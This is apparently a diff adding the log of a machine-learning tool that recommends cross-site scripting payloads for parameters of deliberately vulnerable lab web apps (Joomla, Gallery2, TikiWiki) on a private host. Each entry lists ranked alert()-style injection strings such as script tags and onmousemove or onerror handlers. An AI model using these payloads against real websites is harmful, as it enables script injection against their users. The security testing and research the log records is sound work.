@@ -1,0 +1,172 @@
+[+] Target url: http://192.168.25.208/joomla/index.php?option=com_user&view=login&Itemid=2
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	<script>alert``;</script>	0.9334863424301147
+[*] 2	 onmousemove=alert``; 	0.06047453731298447
+[*] 3	<script>alert();</script>	0.0048480406403541565
+[+] Finish prediction...
+[*] Elapsed time :6.3545753955841064[sec]
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=2:xcloner-21&format=pdf
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+2020-04-24 20:11:33.872548: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	<script>alert``;</script>	0.9334863424301147
+[*] 2	 onmousemove=alert``; 	0.06047453731298447
+[*] 3	<script>alert();</script>	0.0048480406403541565
+[+] Finish prediction...
+[*] Elapsed time :1.0276086330413818[sec]
+
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=2:xcloner-21&tmpl=component&print=1&layout=default&page=
+Parameter: layout
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	<script>alert``;</script>	0.9334863424301147
+[*] 2	 onmousemove=alert``; 	0.06047453731298447
+[*] 3	<script>alert();</script>	0.0048480406403541565
+[+] Finish prediction...
+[*] Elapsed time :4.930743932723999[sec]
+
+
+
+[+] Target url: http://192.168.25.208/gallery2/main.php?g2_view=core.UserAdmin&g2_subView=core.UserLogin&g2_return=main.php%3F&&g2_returnName=album
+Parameter: g2_return
+[*] Feature: [5, 3, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert(); 	0.9898279905319214
+[*] 2	" onmousemove=alert();"	0.004569605924189091
+[*] 3	' onerror=alert();'	0.0030389376915991306
+[+] Finish prediction...
+[*] Elapsed time :7.7974419593811035[sec]
+
+
+
+[+] Target url: http://192.168.25.208:80/1142014131/snippets.gtl?uid=brie
+Parameter: uid
+[*] Feature: [10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	<script>alert();</script>	0.9999969005584717
+[*] 2	<script>prompt();</script>	2.444658093736507e-06
+[*] 3	</textarea><script>alert();</script>	6.810039963056624e-07
+[+] Finish prediction...
+[*] Elapsed time :5.943381071090698[sec]
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?option=com_mailto&tmpl=component&link=aHR0cDovLzE5Mi4xNjguMjUuMjA4L2pvb21sYS9pbmRleC5waHA/b3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD0xOndlbGNvbWU=
+Parameter: link
+[*] Feature: [5, 3, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	" onmousemove=alert``;"	0.9657003283500671
+[*] 2	 onmousemove=alert``; 	0.022235160693526268
+[*] 3	msgbox()	0.012008097022771835
+[+] Finish prediction...
+[*] Elapsed time :6.211107969284058[sec]
+
+
+
+
+[+] Target url: http://192.168.25.208/tikiwiki/tiki-featured_link.php?type=f&url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FOWASP_Broken_Web_Applications_Project
+Parameter: url
+[*] Feature: [8, 2, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	</textarea><img src=x onerror=alert();>	0.7696005702018738
+[*] 2	<script>alert();</script>	0.14132702350616455
+[*] 3	"></iframe><script>alert();</script>	0.08579179644584656
+[+] Finish prediction...
+[*] Elapsed time :2.0721354484558105[sec]
+
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=1:welcome&format=pdf
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	<script>alert``;</script>	0.9334863424301147
+[*] 2	 onmousemove=alert``; 	0.06047453731298447
+[*] 3	<script>alert();</script>	0.0048480406403541565
+[+] Finish prediction...
+[*] Elapsed time :2.8788580894470215[sec]
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=1:welcome&tmpl=component&print=1&layout=default&page=
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	<script>alert``;</script>	0.9334863424301147
+[*] 2	 onmousemove=alert``; 	0.06047453731298447
+[*] 3	<script>alert();</script>	0.0048480406403541565
+[+] Finish prediction...
+[*] Elapsed time :1.2775063514709473[sec]
+
+
+
+
+[+] Target url: http://192.168.25.208:80/1142014131/snippets.gtl?uid=cheddar
+Parameter: uid
+[*] Feature: [9, 99, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	" onmousemove=alert``;"	1.0
+[*] 2	"; confirm();//	0.0
+[*] 3	'%0d%0a MsgBox '3122	0.0
+[+] Finish prediction...
+[*] Elapsed time :2.0812907218933105[sec]
+
+
+
+
+
+
+
+
+
+
